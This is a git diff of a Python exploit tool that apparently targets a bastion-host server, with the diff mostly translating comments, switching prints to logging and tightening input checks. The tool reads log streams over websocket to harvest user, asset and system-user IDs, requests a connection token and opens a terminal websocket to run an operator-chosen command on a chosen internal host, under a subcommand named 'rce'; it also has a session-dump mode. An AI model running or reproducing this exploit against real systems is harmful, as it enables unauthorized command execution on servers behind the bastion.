@@ -466,7 +466,7 @@ async def read_log(target):
     return id_tuple_set
 
 
-# 向服务器端发送认证后的消息
+# Send authenticated message to server
 async def send_msg(websocket, _text):
     if _text == "exit":
         print(f'you have enter "exit", goodbye')
@@ -477,7 +477,6 @@ async def send_msg(websocket, _text):
     logger.debug(f"[*] {recv_text}")
 
 
-# 获取token
 def get_token(user, asset, system_user):
     token_url = "/api/v1/authentication/connection-token/?user-only=Veraxy"
     data = {"user": user, "asset": asset, "system_user": system_user}
@@ -506,26 +505,26 @@ async def detection_target(token):
         return False
 
 
-# 建立连接
 async def main_logic(cmd, tty_url):
+    # TODO Get an interactive shell?
     async with websockets.connect(tty_url) as websocket:
         recv_text = await websocket.recv()
         recv_json = json.loads(recv_text)
-        print("<<< {}".format(recv_json['data']))
+        logger.debug(recv_json['data'])
         id = recv_json['id']
-        print("ws id: " + id)
-        print("init ws")
+        logger.debug("ws id: " + id)
+        logger.debug("init ws")
         inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":234,\"rows\":13 }"})
         await send_msg(websocket, inittext)
-        print("###############")
-        print("exec command: ")
-        cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd + "\r\n"})
-        print(cmdtext)
-        await send_msg(websocket, cmdtext)
+        cmd_text = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd + "\r\n"})
+        logger.info('[*] exec command: {}'.format(cmd))
+        await send_msg(websocket, cmd_text)
+        print('<<<')
         for i in range(10):
             recv_text = await websocket.recv()
-            print(f"{recv_text}")
-        print('===========finish')
+            recv_json = json.loads(recv_text)
+            print(recv_json['data'])
+        logger.info('[+] finish')
 
 
 def rce():
@@ -533,9 +532,8 @@ def rce():
     log_target = base_url.replace("https://", "wss://").replace("http://", "ws://") + log_url
     logger.info("[*] log_target: %s" % (log_target,))
 
-    # 获取user、asset、system_user组成的目标集合
+    # user、asset、system_user
     id_tuple_set = asyncio.get_event_loop().run_until_complete(read_log(log_target))
-    # 判断目标是否可用
     logger.info("[*] Checking for target connectivity...")
     active_result = []
     for id_tuple in id_tuple_set:
@@ -545,6 +543,7 @@ def rce():
         if status:
             active_result.append(id_tuple)
     logger.info("[+] [{}] targets can be connected".format(len(active_result)))
+    time.sleep(.5)
     i = 1
     for result in active_result:
         print(
@@ -552,18 +551,27 @@ def rce():
         )
         i += 1
     print("Please select the target: ")
-    choice_target = int(input(">>> "))
-    if choice_target > len(active_result):
-        choice_target = int(input("Please reselect:"))
+    choice_target = 0
+    while True:
+        try:
+            time.sleep(.5)
+            choice_target = int(input(">>> "))
+            if choice_target > len(active_result) or choice_target < 1:
+                continue
+            break
+        except ValueError:
+            logger.warning("[-] Only numbers can be entered (ex: 1), please continue to enter")
+            continue
+
     print("Your choice is %s" % choice_target)
     cmd = input("Please enter the command to execute: ")
-    # 获取token
+    # token
     token = get_token(
         active_result[choice_target - 1][2], active_result[choice_target - 1][0], active_result[choice_target - 1][1]
     )
     logger.info("[+] token: {}".format(token))
     tty_url = make_tty_url(token)
-    # 建立tty连接
+    # tty
     logger.info("[*] websocket target: {}".format(tty_url))
     logger.info("[*] Start connection establishment")
     asyncio.get_event_loop().run_until_complete(main_logic(cmd, tty_url))
@@ -669,6 +677,7 @@ if __name__ == "__main__":
         context = DumpContext(base_url, args.outpath)
         dump_sessions(context)
     elif args.subcommand == "rce":
+        # TODO for protocol like rdp ?
         rce()
     else:
         parser.print_help()
